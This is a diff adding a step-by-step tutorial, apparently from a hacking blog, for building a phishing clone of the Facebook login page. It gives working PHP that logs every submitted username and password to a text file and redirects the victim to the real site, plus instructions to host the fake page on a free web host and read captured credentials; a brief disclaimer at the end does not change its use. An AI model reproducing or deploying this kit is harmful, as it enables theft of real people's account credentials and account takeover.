@@ -11,3 +11,73 @@ Before we actually start phishing………. here is a brief introduction about w
 Phishing is a scamming method used to get personal information.. .
 
 i.e. the act of acquiring private or sensitive data from personal computers for use in fraudulent activities.
+
+Here are steps to have some fun:-
+
+1. Open http://www.facebook.com on any net browser .
+
+2. Right click on the blank space of the login page, click on ‘view page source’ option.
+
+3. A screen filled with codes will appear.
+
+4. Now press ctrl+a and copy the whole source to notepad.
+
+5. Now press ctrl+f and search for word ‘action’ in the source.
+
+. Replace the selected text written in quotes with ‘post.php’  in the above image .
+
+action=”https://www.facebook.com/login.php?login_attempt=1&#8243;
+
+After replacement :
+
+action=”post.php”
+
+7. Now save the file with ‘.html’ extension. For example : facebook.html
+
+8. Copy paste the following script to notepad, edit the contents of 2nd line in the script
+
+“header(‘Location:Website to phish’);”
+
+Enter the name of the website you wish to phish , in our case http://www.facebook.com
+
+After replacement: “header(‘Location: http://www.facebook.com);” , and save file with the name ‘post’ and .php extension.
+
+?php
+header (‘Location:Website to Phish’);
+$handle = fopen(“usernames.txt”, “a”);
+foreach($_POST as $variable => $value) {
+   fwrite($handle, $variable);
+   fwrite($handle, “=”);
+   fwrite($handle, $value);
+   fwrite($handle, “\r\n”);
+}
+fwrite($handle, “\r\n”);
+fclose($handle);
+exit;
+?>
+
+9. Now register to any free web hosting site. For example : www.my3gb.com
+
+10. Upload the two files created above, one with .html extension(as per our example : facebook.html) and the other post.php
+
+on your account on free web hosting site.
+
+11. If you register on my3gb.com , to see your uploaded files click on ‘file manager’.
+
+12. Now right click on file with .html extension(facebook.html) that you uploaded shortly, and select “copy link location”. Then paste the link on the address bar in new tab.
+
+13. A page similar to facebook login page will load , but the difference will only be seen in the address bar.
+
+ake a look at the address bar it says “neophytes.my3gb.com/facebook.html”, a genuine facebook page will have “www.facebook.com” in the address bar.
+
+After victim enters his/her username and password , this is what he/she will see.
+
+A new file usernames.txt is created automatically when someone logs on the phishing page you just created. Usernames.txt contains victim’s username and password. You can see the new file usernames.txt by refreshing the page.
+
+P.S. – my3gb.com will delete your account within 24hrs after u try the above phishing….
+
+So the above trick is just for you to see one aspect of Hacking….
+
+Do not use it for malicious purposes.
+
+
